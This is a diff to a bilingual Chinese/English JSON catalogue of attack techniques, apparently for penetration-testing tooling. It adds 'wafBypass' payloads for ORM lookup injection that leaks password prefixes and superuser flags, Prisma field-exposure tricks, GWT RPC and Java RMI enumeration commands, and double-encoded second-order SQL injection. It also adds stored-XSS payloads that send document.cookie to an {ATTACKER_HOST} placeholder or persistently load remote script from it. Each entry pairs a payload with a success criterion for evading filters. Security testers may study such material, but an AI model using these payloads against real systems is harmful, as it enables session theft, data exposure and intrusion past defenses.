+          "command": "{\"username\":\"admin\",\"password__startswith\":\"\\u0061\"}",
+          "description": {
+            "zh": "绕过对查找键与值明文的组合规则：值用 Unicode 转义传递；探测结果与预期字符一致即成功。",
+            "en": "Pass the probe value Unicode-escaped against plaintext key/value rules; the probe result matching the intended character confirms success."
+          }
+        }
       ]
     },
     {
@@ -1674,8 +2199,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "对象属性级授权",
-        "en": "Object Property-Level Authorization"
+        "zh": "对象与属性级越权 BOLA/IDOR",
+        "en": "Object & Property-Level Authorization (BOLA/IDOR)"
       },
       "tutorial": {
         "overview": {
@@ -1766,6 +2291,41 @@
           "zh": "删除两租户测试对象和 marker，清理 ORM/query 缓存与审计日志，恢复对象级 scope 后分别回归同租户和跨租户请求。",
           "en": "Delete both tenants' test objects and markers, clear ORM and query caches plus audit logs, restore object-level scope, and regress same-tenant and cross-tenant requests."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "深层双下划线遍历",
+            "en": "Deep Double-Underscore Traversal"
+          },
+          "command": "{\"username\": \"admin\", \"profile__user__password__startswith\": \"a\"}\n{\"username\": \"admin\", \"profile__org__owner__is_superuser\": true}",
+          "description": {
+            "zh": "加长关系链绕过只拦截一层关系字段的过滤。成功判据：响应泄露深层字段信息。",
+            "en": "Longer relation chains bypass filters that only block one hop. Success: responses leak deep-field information."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码下划线变形",
+            "en": "Encoded Underscore Mutation"
+          },
+          "command": "{\"username\": \"admin\", \"profile%5F%5Fphone\": \"1\"}\n?username=admin&profile%5F%5Fphone=1",
+          "description": {
+            "zh": "编码的双下划线在解码层还原为 ORM 查找语法。成功判据：还原后执行关系查询。",
+            "en": "Encoded double underscores resolve into ORM lookup syntax at the decode layer. Success: relation queries execute after decoding."
+          }
+        },
+        {
+          "title": {
+            "zh": "exclude/in 变体语法",
+            "en": "exclude/in Variant Syntax"
+          },
+          "command": "{\"username\": {\"in\": [\"admin\", \"root\"]}, \"profile__phone__regex\": \"^1\"}\n{\"exclude\": {\"id\": 0}, \"username\": \"admin\"}",
+          "description": {
+            "zh": "换用 in/regex/exclude 查找类型绕过 startswith 特征。成功判据：变体查询同样返回越权数据。",
+            "en": "Switching to in/regex/exclude lookups evades startswith signatures. Success: variant queries also return unauthorized data."
+          }
+        }
       ]
     },
     {
@@ -1783,8 +2343,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "查询形状与属性级授权",
-        "en": "Query Shape and Property-Level Authorization"
+        "zh": "对象与属性级越权 BOLA/IDOR",
+        "en": "Object & Property-Level Authorization (BOLA/IDOR)"
       },
       "tutorial": {
         "overview": {
@@ -1875,6 +2435,41 @@
           "zh": "删除合成记录/关系，清理 Prisma 与 API 缓存、query 日志和测试响应，恢复服务端 schema/字段 allowlist 后回归。",
           "en": "Delete synthetic records and relations, clear Prisma and API caches, query logs, and test responses, restore server-side schema and field allowlists, and regress."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "include 替代 select",
+            "en": "include Instead of select"
+          },
+          "command": "{\"where\": {\"username\": \"admin\"}, \"include\": {\"password\": true, \"email\": true}}",
+          "description": {
+            "zh": "include 通道绕过只过滤 select 字段的属性级授权。成功判据：返回敏感关联字段。",
+            "en": "The include channel bypasses property authorization applied only to select. Success: sensitive relations are returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "嵌套 where 条件注入",
+            "en": "Nested where Injection"
+          },
+          "command": "{\"where\": {\"AND\": [{\"username\": \"admin\"}, {\"role\": {\"equals\": \"admin\"}}], \"OR\": [{\"id\": {\"gt\": 0}}]}",
+          "description": {
+            "zh": "AND/OR 嵌套结构绕过扁平 where 的字段白名单。成功判据：查询命中越权条件。",
+            "en": "AND/OR nesting bypasses flat-where field whitelists. Success: the query matches unauthorized conditions."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码字段名变形",
+            "en": "Encoded Field-Name Mutation"
+          },
+          "command": "{\"where\": {\"username\": \"admin\"}, \"select\": {\"pass%77ord\": true}}\n{\"where\": {\"%75sername\": \"admin\"}}",
+          "description": {
+            "zh": "编码字段名在解析层还原绕过字段黑名单。成功判据：还原字段被查询返回。",
+            "en": "Encoded field names resolve at parse time bypassing field blacklists. Success: resolved fields are queried and returned."
+          }
+        }
       ]
     },
     {
@@ -1892,8 +2487,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "GWT RPC 服务发现",
-        "en": "GWT RPC Service Discovery"
+        "zh": "API 与 RPC 攻击面发现",
+        "en": "API & RPC Attack Surface Discovery"
       },
       "tutorial": {
         "overview": {
@@ -1984,6 +2579,41 @@
           "zh": "关闭测试会话，删除专用 marker 方法/数据和请求日志，清理 GWT 缓存/编译测试产物，并确认 endpoint 授权回归。",
           "en": "Close test sessions, delete dedicated marker methods or data and request logs, clear GWT caches and test compilation artifacts, and confirm endpoint authorization regression."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "policy 文件探测",
+            "en": "Policy File Probing"
+          },
+          "command": "/gwt/xxxpolicy /gwt/*.gwt.rpc\nGET /crossdomain.xml\nGET /client.policy",
+          "description": {
+            "zh": "读取 GWT policy 与跨域策略文件还原服务方法清单。成功判据：返回可解析的 RPC 方法签名。",
+            "en": "Reading GWT policy and cross-domain files reconstructs the service method inventory. Success: parseable RPC method signatures return."
+          }
+        },
+        {
+          "title": {
+            "zh": "方法名变形探测",
+            "en": "Method-Name Mutation Probing"
+          },
+          "command": "POST /gwt/service HTTP/1.1\r\nContent-Type: text/x-gwt-rpc; charset=utf-8\r\n\r\n7|0|8|http://{TARGET}/gwt/|A1B2C3|com.lab.Service greeting|java.lang.String|admin|1|2|3|4|2|1|5|6|",
+          "description": {
+            "zh": "RPC 载荷内方法名大小写与分隔变形绕过方法黑名单。成功判据：服务端返回序列化响应而非拒绝。",
+            "en": "Case and delimiter mutations of in-payload method names bypass method blacklists. Success: the server returns a serialized response instead of rejecting."
+          }
+        },
+        {
+          "title": {
+            "zh": "内容协商变换",
+            "en": "Content Negotiation Swap"
+          },
+          "command": "curl -sS --max-time 5 -H \"Content-Type: text/x-gwt-rpc\" -H \"Accept: text/x-gwt-rpc\" --data-binary '7|0|8|http://{TARGET}/gwt/|POLICY|com.lab.Service|' http://{TARGET}/gwt/service",
+          "description": {
+            "zh": "RPC 专用 Content-Type 绕过 JSON/表单导向的 WAF 检查。成功判据：请求进入 GWT 处理器。",
+            "en": "The RPC-specific Content-Type bypasses JSON/form-oriented WAF inspection. Success: the request reaches the GWT handler."
+          }
+        }
       ]
     },
     {
@@ -2001,8 +2631,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "Java RMI 远程服务",
-        "en": "Java RMI Remote Services"
+        "zh": "API 与 RPC 攻击面发现",
+        "en": "API & RPC Attack Surface Discovery"
       },
       "tutorial": {
         "overview": {
@@ -2093,6 +2723,41 @@
           "zh": "关闭所有 JRMP 连接，解绑并删除测试远程对象/marker，清理 Registry 和防火墙日志，恢复网络 ACL 与序列化过滤后复查。",
           "en": "Close all JRMP connections, unbind and delete test remote objects and markers, clear Registry and firewall logs, restore network ACLs and serialization filters, and recheck."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "邻近端口与随机对象名扫描",
+            "en": "Adjacent-Port Scan with Random Object Names"
+          },
+          "command": "1090\n1097\n1099\n1100\n1199\n1299",
+          "description": {
+            "zh": "绕过针对固定 1099 的端口级告警：邻域扫描发现迁移过的 RMI 端口。成功判据：任一端口返回 RMI JRMP 握手特征。",
+            "en": "Scanning adjacent ports evades alerts pinned to 1099 and finds migrated RMI listeners. Success: any port returns a JRMP handshake signature."
+          }
+        },
+        {
+          "title": {
+            "zh": "JNDI 路径探测",
+            "en": "JNDI Path Probing"
+          },
+          "command": "service:jmx:rmi:///jndi/rmi://{TARGET}:1099/jmxrmi\nservice:jmx:rmi:///jndi/rmi://{TARGET}:1099/Activator\nservice:jmx:rmi:///jndi/rmi://{TARGET}:1099/DefaultAgent",
+          "description": {
+            "zh": "JNDI URL 变体探测不同注册对象名。成功判据：任一路径返回 MBean/对象引用。",
+            "en": "JNDI URL variants probe different registry object names. Success: any path returns an MBean/object reference."
+          }
+        },
+        {
+          "title": {
+            "zh": "TLS RMI 通道探测",
+            "en": "TLS RMI Channel Probe"
+          },
+          "command": "openssl s_client -connect {TARGET}:1099 -brief </dev/null\nnmap -p 1098-1200 --script rmi-dumpregistry {TARGET}",
+          "description": {
+            "zh": "TLS 包装的 RMI 与脚本化枚举绕过明文特征检测。成功判据：枚举出远程对象名。",
+            "en": "TLS-wrapped RMI plus scripted enumeration evades cleartext detection. Success: remote object names are enumerated."
+          }
+        }
       ]
     },
     {
@@ -2110,8 +2775,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "二阶 SQL 闭合与延迟变体",
-        "en": "Second-Order SQL Closure and Delay Variants"
+        "zh": "载体与场景变体",
+        "en": "Carriers & Context Variants"
       },
       "tutorial": {
         "overview": {
@@ -2202,6 +2867,41 @@
           "zh": "回滚/删除存储 token、合成用户和 marker 行，清理报表/任务队列及查询缓存，删除测试审计副本并回归参数化流程。",
           "en": "Roll back or delete stored tokens, synthetic users, and marker rows, clear report and job queues plus query caches, delete test audit copies, and regress parameterized flows."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双重编码闭合",
+            "en": "Doubly Encoded Closure"
+          },
+          "command": "admin%2527%2520--",
+          "description": {
+            "zh": "绕过只解码一次的输入过滤：闭合引号与注释二次编码；二阶查询报错即成功。",
+            "en": "Double-encode the closing quote and comment past single-decode filters; an error in the second-order query confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写与注释组合",
+            "en": "Case with Comment Combination"
+          },
+          "command": "Admin%27/**/--",
+          "description": {
+            "zh": "绕过区分大小写且按空格分词的规则：用户名混合大小写并注释占位；存储后二次执行生效即成功。",
+            "en": "Mix case and pad with comments against case-sensitive tokenizers; effectiveness on second-order execution confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "反引号与括号闭合",
+            "en": "Backtick and Parenthesis Closure"
+          },
+          "command": "admin%60--\nadmin%29--",
+          "description": {
+            "zh": "探测二阶查询非常规闭合并绕过引号过滤：反引号/括号闭合变体；二次查询报错语义变化即成功。",
+            "en": "Probe non-standard closures against quote filtering; changed error semantics in the second-order query confirm success."
+          }
+        }
       ]
     },
     {
@@ -2219,8 +2919,8 @@
         "en": "Cross-Site Scripting"
       },
       "subCategory": {
-        "zh": "存储型 XSS 与高权限 Sink",
-        "en": "Stored XSS in Privileged Sinks"
+        "zh": "存储型与 Blind XSS",
+        "en": "Stored & Blind XSS"
       },
       "tutorial": {
         "overview": {
@@ -2310,6 +3010,52 @@
         {
           "zh": "删除存储记录及搜索索引/队列副本，清理模板/CDN/浏览器缓存，移除 marker 与 service worker，吊销测试会话并复查后台。",
           "en": "Delete stored records plus search-index and queue copies, clear template, CDN, and browser caches, remove markers and service workers, revoke test sessions, and recheck the admin view."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "Base64 编码外带",
+            "en": "Base64-encoded exfil"
+          },
+          "command": "<script>new Image().src='https://{ATTACKER_HOST}/?c='+btoa(document.cookie)</script>",
+          "description": {
+            "zh": "绕过 cookie 明文检测：编码后外带。判据：服务端 base64 还原出 cookie。",
+            "en": "Encodes the cookie before egress. Success: server decodes the cookie."
+          }
+        },
+        {
+          "title": {
+            "zh": "Blob Beacon 外带",
+            "en": "Blob beacon exfil"
+          },
+          "command": "<script>navigator.sendBeacon('https://{ATTACKER_HOST}/b',new Blob([document.cookie],{type:'text/plain'}))</script>",
+          "description": {
+            "zh": "绕过 URL 长度与明文：Blob body 发送。判据：POST body 含 cookie。",
+            "en": "Sends the cookie as a Blob body. Success: cookie in POST body."
+          }
+        },
+        {
+          "title": {
+            "zh": "持久化钩子注入",
+            "en": "Persistent hook injection"
+          },
+          "command": "<script>if(!localStorage.x2){localStorage.x2=1;var s=document.createElement('script');s.src='//{ATTACKER_HOST}/x';document.head.appendChild(s)}</script>",
+          "description": {
+            "zh": "绕过一次性触发清理：localStorage 防重载持续控制。判据：管理员多次访问均回连。",
+            "en": "localStorage flag keeps control across views. Success: repeated callbacks from admin sessions."
+          }
+        },
+        {
+          "title": {
+            "zh": "CSS 备用外带",
+            "en": "CSS fallback exfil"
+          },
+          "command": "<style>input[value^=\"a\"]{background:url(https://{ATTACKER_HOST}/?a)}</style>",
+          "description": {
+            "zh": "脚本被过滤时退化为 CSS 侧信道。判据：CSS 请求命中字符。",
+            "en": "Falls back to CSS side channel when script is filtered. Success: CSS requests arrive."
+          }
         }
       ]
     },
